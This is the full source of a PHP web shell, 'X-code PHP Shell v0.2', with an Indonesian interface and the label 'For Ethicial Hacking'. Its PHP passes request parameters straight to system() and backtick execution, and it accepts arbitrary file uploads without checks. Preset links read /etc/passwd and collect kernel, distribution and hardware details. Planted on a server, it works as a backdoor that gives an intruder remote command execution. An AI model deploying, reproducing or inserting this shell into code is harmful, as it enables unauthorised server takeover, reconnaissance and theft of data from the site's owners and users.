<html>
<head>
<title>X-code PHP Shell</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style type="text/css">
@charset "UTF-8";
html {
	height: 100%;
}
body {
	background-color: #262626;
	display: flex;
	flex-direction: column;
	margin: 0;
	height: inherit;
	color: #F8F8F8;
	font-family: "Armata", sans-serif;
	font-size: 1em;
	font-weight: 400;
	text-align: left;
}
.home {
	display: flex;
	flex-direction: column;
	align-items: center;
	justify-content: center;
	flex: 1 0 auto;
	padding: 0.5em;
}
.home a {
	color: green;
	font-size: 0.9em;
	text-decoration: none;
	cursor: pointer;
}
.home p {
	margin: 0;
	font-size: 1.2em;
	text-align: center;
	text-shadow: 0 0 0.5em #000;
}
.home p:not(:last-child) {
	margin-bottom: 0.5em;
}
.home header {
	text-align: center;
	text-shadow: 0 0 0.5em #000;
}
.home header .title {
	margin: 0;
	font-size: 3.6em;
	font-weight: 400;
}
.home header p {
	margin: 0;
	font-size: 1.7em;
}
.home img {
	margin-bottom: 0.5em;
	height: 14em;
	color: #F8F8F8;
	text-shadow: 0 0 0.5em #000;
	border: 0.07em solid #000;
}
</style>
</head>

<body>
	<div class="home">
	<header>
		<h1 class="title">X-code PHP Shell v0.2/h1>
		<p>For Ethicial Hacking</p><br>
	</header>
	<p>
		<a href="?">Home</a> &#8226; 
		<a href="?shell">Shell</a> &#8226; 
		<a href="?inject">Upload</a> &#8226; 
		<a href="?cmd=uname -a">Cek kernel</a> &#8226; 
		<a href="?cmd=lsb_release -a">Cek Distro linux</a> &#8226; 
		<a href="?cmd=php -v">Cek versi PHP</a> &#8226; 
		<a href="?cmd=lscpu">Cek CPU</a> &#8226;  
		<a href="?cmd=free">Cek RAM</a> &#8226;
		<a href="?cmd=cat /etc/passwd">Cek User linux</a>
	</p>
<?php
if (empty($_REQUEST)) {
	echo '<img src="https://camo.githubusercontent.com/7677d5854ed80ca9d724e1050bbe57d861f575e5/687474703a2f2f78636f64657365727665722e6d792e69642f676f666f6f642e706e67" alt="Donasi Gopay Kurniawan">';
	echo '<br>';
	echo '<a href="https://xcode.or.id">Dibuat Oleh Kurniawan X-code</a>';
} 

if (!empty($_GET['cmd'])) { 
	echo "<pre>"; system($_GET['cmd']); echo "</pre>"; exit; 
} 
 
if(isset($_GET['inject'])) { 
	if(isset($_POST['cekfile'])) {
		move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
		echo "Upload berhasil";
	} else {
		echo '<form enctype="multipart/form-data" action="" method="post">
		Nama file : <input type="file" name="file" />
		<br /><input name="cekfile" type="submit" value="Upload"></form>';
 	} 
} 

if(isset($_GET['shell'])) { 
	if(isset($_POST['x'])) {
		echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">
		<input type="text" name="x" value="ls -l">
		<input type="submit" value="Execute">
		</form>';
?>
<pre>
<?= `{$_POST['x']};` ?> </pre> <? die(); ?>
<?php 
	} else {
		echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">
		<input type="text" name="x" value="ls -l">
		<input type="submit" value="Execute">
    	</form>';
 	} 
}
?>
	</div>
</body>
</html>
